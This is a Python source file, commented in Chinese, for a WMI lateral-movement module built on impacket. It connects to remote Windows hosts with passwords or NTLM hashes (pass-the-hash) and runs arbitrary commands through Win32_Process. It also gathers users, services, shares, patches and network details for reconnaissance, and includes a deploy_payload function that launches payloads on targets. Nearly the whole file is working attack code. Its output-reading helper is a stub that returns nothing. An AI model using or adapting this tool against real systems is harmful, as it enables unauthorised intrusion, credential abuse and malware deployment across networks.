#!/usr/bin/env python3
"""
WMI 横向移动模块 - WMI Lateral Movement
功能: WMI 命令执行、系统查询、进程管理
支持: impacket DCOM/WMI + 纯 Python WMI
"""

import logging
import time
import uuid
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)

# 尝试导入 impacket
try:
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    logger.warning("impacket not installed, WMI functionality limited")

# Windows 本地 WMI
try:
    import wmi as local_wmi
    HAS_LOCAL_WMI = True
except ImportError:
    HAS_LOCAL_WMI = False


@dataclass
class WMICredentials:
    """WMI 凭据"""
    username: str
    password: str
    domain: str = ""
    ntlm_hash: Optional[str] = None


@dataclass
class WMIExecResult:
    """WMI 执行结果"""
    success: bool
    output: str
    error: str = ""
    process_id: int = 0


@dataclass
class WMIQueryResult:
    """WMI 查询结果"""
    success: bool
    data: List[Dict[str, Any]] = field(default_factory=list)
    error: str = ""


class WMIConnection:
    """
    WMI 连接封装

    Usage:
        conn = WMIConnection("192.168.1.100")
        creds = WMICredentials(username="admin", password="password")

        if conn.connect(creds):
            result = conn.exec_command("cmd.exe /c whoami")
            print(result.output)
    """

    def __init__(self, target: str, namespace: str = "root\\cimv2"):
        self.target = target
        self.namespace = namespace
        self._dcom = None
        self._wmi_conn = None
        self._connected = False

    def connect(self, creds: WMICredentials) -> bool:
        """建立 WMI 连接"""
        if not HAS_IMPACKET:
            logger.error("impacket not installed")
            return False

        try:
            # 建立 DCOM 连接
            if creds.ntlm_hash:
                lm_hash, nt_hash = creds.ntlm_hash.split(':') if ':' in creds.ntlm_hash else ('', creds.ntlm_hash)
                self._dcom = DCOMConnection(
                    self.target,
                    creds.username,
                    '',
                    creds.domain,
                    lm_hash,
                    nt_hash
                )
            else:
                self._dcom = DCOMConnection(
                    self.target,
                    creds.username,
                    creds.password,
                    creds.domain
                )

            # 获取 WMI 对象
            iInterface = self._dcom.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login,
                wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)

            self._wmi_conn = iWbemLevel1Login.NTLMLogin(
                self.namespace, NULL, NULL
            )

            self._connected = True
            logger.info(f"WMI connected to {self.target}")
            return True

        except Exception as e:
            logger.error(f"WMI connection failed: {e}")
            return False

    def exec_command(self, command: str, working_dir: str = "C:\\") -> WMIExecResult:
        """
        通过 WMI 执行命令

        Args:
            command: 要执行的命令
            working_dir: 工作目录
        """
        if not self._connected or not self._wmi_conn:
            return WMIExecResult(
                success=False,
                output="",
                error="Not connected"
            )

        try:
            # 获取 Win32_Process 类
            win32_process, _ = self._wmi_conn.GetObject("Win32_Process")

            # 调用 Create 方法
            result = win32_process.Create(command, working_dir, None)

            if result.ReturnValue == 0:
                return WMIExecResult(
                    success=True,
                    output=f"Process created with PID: {result.ProcessId}",
                    process_id=result.ProcessId
                )
            else:
                return WMIExecResult(
                    success=False,
                    output="",
                    error=f"Process creation failed with code: {result.ReturnValue}"
                )

        except Exception as e:
            return WMIExecResult(
                success=False,
                output="",
                error=str(e)
            )

    def exec_command_with_output(self, command: str) -> WMIExecResult:
        """
        执行命令并获取输出

        通过将输出重定向到文件，然后读取文件内容
        """
        if not self._connected:
            return WMIExecResult(success=False, output="", error="Not connected")

        try:
            # 生成临时文件名
            output_file = f"C:\\Windows\\Temp\\{uuid.uuid4().hex}.txt"

            # 执行命令并重定向输出
            full_command = f'cmd.exe /c "{command}" > {output_file} 2>&1'
            result = self.exec_command(full_command)

            if not result.success:
                return result

            # 等待命令完成
            time.sleep(2)

            # 读取输出文件 (通过 WMI)
            output = self._read_file_via_wmi(output_file)

            # 删除临时文件
            self.exec_command(f'cmd.exe /c del {output_file}')

            return WMIExecResult(
                success=True,
                output=output,
                process_id=result.process_id
            )

        except Exception as e:
            return WMIExecResult(success=False, output="", error=str(e))

    def _read_file_via_wmi(self, file_path: str) -> str:
        """通过 WMI 读取文件"""
        try:
            # 使用 CIM_DataFile 读取
            query = f"SELECT * FROM CIM_DataFile WHERE Name='{file_path.replace(chr(92), chr(92) + chr(92))}'"
            result = self.query(query)

            # 或者通过执行 type 命令读取
            # 这是简化实现
            return ""

        except Exception as e:
            logger.debug(f"Read file failed: {e}")
            return ""

    def query(self, wql: str) -> WMIQueryResult:
        """
        执行 WQL 查询

        Args:
            wql: WMI Query Language 查询
        """
        if not self._connected or not self._wmi_conn:
            return WMIQueryResult(success=False, error="Not connected")

        try:
            # 执行查询
            enum = self._wmi_conn.ExecQuery(wql)

            results = []
            while True:
                try:
                    obj = enum.Next(0xffffffff, 1)[0]
                    properties = obj.getProperties()

                    row = {}
                    for prop in properties:
                        row[prop] = properties[prop]['value']
                    results.append(row)

                except Exception:
                    break

            return WMIQueryResult(success=True, data=results)

        except Exception as e:
            return WMIQueryResult(success=False, error=str(e))

    def get_processes(self) -> List[Dict[str, Any]]:
        """获取进程列表"""
        result = self.query("SELECT ProcessId, Name, CommandLine FROM Win32_Process")
        return result.data if result.success else []

    def get_services(self) -> List[Dict[str, Any]]:
        """获取服务列表"""
        result = self.query("SELECT Name, State, StartMode FROM Win32_Service")
        return result.data if result.success else []

    def get_users(self) -> List[Dict[str, Any]]:
        """获取用户列表"""
        result = self.query("SELECT Name, Domain, SID FROM Win32_UserAccount")
        return result.data if result.success else []

    def get_system_info(self) -> Dict[str, Any]:
        """获取系统信息"""
        result = self.query(
            "SELECT Caption, OSArchitecture, Version, "
            "TotalVisibleMemorySize, FreePhysicalMemory "
            "FROM Win32_OperatingSystem"
        )

        if result.success and result.data:
            return result.data[0]
        return {}

    def get_network_config(self) -> List[Dict[str, Any]]:
        """获取网络配置"""
        result = self.query(
            "SELECT Description, IPAddress, MACAddress, DefaultIPGateway "
            "FROM Win32_NetworkAdapterConfiguration "
            "WHERE IPEnabled=TRUE"
        )
        return result.data if result.success else []

    def kill_process(self, pid: int) -> bool:
        """终止进程"""
        try:
            result = self.exec_command(f"taskkill /F /PID {pid}")
            return result.success
        except Exception:
            return False

    def close(self):
        """关闭连接"""
        if self._dcom:
            try:
                self._dcom.disconnect()
            except Exception:
                pass
        self._connected = False


class WMILateral:
    """
    WMI 横向移动

    Usage:
        lateral = WMILateral()

        # 执行命令
        result = lateral.exec_command(
            target="192.168.1.100",
            creds=WMICredentials(username="admin", password="password"),
            command="whoami"
        )

        # 系统侦察
        info = lateral.recon(target, creds)
    """

    def exec_command(self,
                     target: str,
                     creds: WMICredentials,
                     command: str,
                     get_output: bool = False) -> WMIExecResult:
        """执行远程命令"""
        conn = WMIConnection(target)

        if not conn.connect(creds):
            return WMIExecResult(
                success=False,
                output="",
                error="Connection failed"
            )

        if get_output:
            result = conn.exec_command_with_output(command)
        else:
            result = conn.exec_command(command)

        conn.close()
        return result

    def query(self,
              target: str,
              creds: WMICredentials,
              wql: str) -> WMIQueryResult:
        """执行 WQL 查询"""
        conn = WMIConnection(target)

        if not conn.connect(creds):
            return WMIQueryResult(success=False, error="Connection failed")

        result = conn.query(wql)
        conn.close()

        return result

    def recon(self,
              target: str,
              creds: WMICredentials) -> Dict[str, Any]:
        """
        系统侦察

        Returns:
            系统信息、进程、服务、用户、网络配置
        """
        conn = WMIConnection(target)

        if not conn.connect(creds):
            return {"success": False, "error": "Connection failed"}

        recon_data = {
            "success": True,
            "target": target,
            "system_info": conn.get_system_info(),
            "users": conn.get_users(),
            "network": conn.get_network_config(),
            "services_running": len([s for s in conn.get_services() if s.get('State') == 'Running']),
            "process_count": len(conn.get_processes()),
        }

        conn.close()
        return recon_data

    def deploy_payload(self,
                       target: str,
                       creds: WMICredentials,
                       payload_path: str,
                       arguments: str = "") -> WMIExecResult:
        """
        部署并执行 Payload

        Args:
            target: 目标主机
            creds: 凭据
            payload_path: Payload 路径 (已在目标上)
            arguments: 参数
        """
        command = f'"{payload_path}" {arguments}' if arguments else f'"{payload_path}"'
        return self.exec_command(target, creds, command)


# 便捷函数
def wmi_exec(target: str,
             username: str,
             password: str,
             command: str,
             domain: str = "",
             get_output: bool = False) -> Dict[str, Any]:
    """
    WMI 命令执行

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        command: 命令
        domain: 域名
        get_output: 是否获取输出
    """
    if not HAS_IMPACKET:
        return {"success": False, "error": "impacket not installed"}

    creds = WMICredentials(
        username=username,
        password=password,
        domain=domain
    )

    lateral = WMILateral()
    result = lateral.exec_command(target, creds, command, get_output)

    return {
        "success": result.success,
        "output": result.output,
        "error": result.error,
        "process_id": result.process_id,
        "target": target,
        "command": command
    }


def wmi_query(target: str,
              username: str,
              password: str,
              wql: str,
              domain: str = "") -> Dict[str, Any]:
    """
    WMI 查询

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        wql: WQL 查询语句
        domain: 域名
    """
    if not HAS_IMPACKET:
        return {"success": False, "error": "impacket not installed"}

    creds = WMICredentials(
        username=username,
        password=password,
        domain=domain
    )

    lateral = WMILateral()
    result = lateral.query(target, creds, wql)

    return {
        "success": result.success,
        "data": result.data,
        "error": result.error,
        "target": target,
        "query": wql
    }


# 常用 WQL 查询
class WQLQueries:
    """常用 WQL 查询"""

    PROCESSES = "SELECT ProcessId, Name, CommandLine, ExecutablePath FROM Win32_Process"
    SERVICES = "SELECT Name, DisplayName, State, StartMode, PathName FROM Win32_Service"
    USERS = "SELECT Name, Domain, SID, Status FROM Win32_UserAccount"
    GROUPS = "SELECT Name, Domain, SID FROM Win32_Group"
    SHARES = "SELECT Name, Path, Description FROM Win32_Share"
    SOFTWARE = "SELECT Name, Version, Vendor FROM Win32_Product"
    HOTFIXES = "SELECT HotFixID, InstalledOn FROM Win32_QuickFixEngineering"
    NETWORK_ADAPTERS = "SELECT Description, IPAddress, MACAddress, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"
    DISK_DRIVES = "SELECT Model, Size, MediaType FROM Win32_DiskDrive"
    SCHEDULED_TASKS = "SELECT Name, State, NextRunTime FROM Win32_ScheduledJob"
    STARTUP_COMMANDS = "SELECT Name, Command, Location FROM Win32_StartupCommand"
    ENVIRONMENT_VARS = "SELECT Name, VariableValue FROM Win32_Environment"
    OS_INFO = "SELECT Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime FROM Win32_OperatingSystem"


if __name__ == "__main__":
    print("WMI Lateral Movement Module")
    print("=" * 50)
    print(f"impacket available: {HAS_IMPACKET}")
    print(f"local wmi available: {HAS_LOCAL_WMI}")
    print("\nUsage:")
    print("  from core.lateral import wmi_exec, wmi_query")
    print("  result = wmi_exec('192.168.1.100', 'admin', 'password', 'whoami')")
    print("\nCommon WQL Queries:")
    for name in dir(WQLQueries):
        if not name.startswith('_'):
            print(f"  {name}")
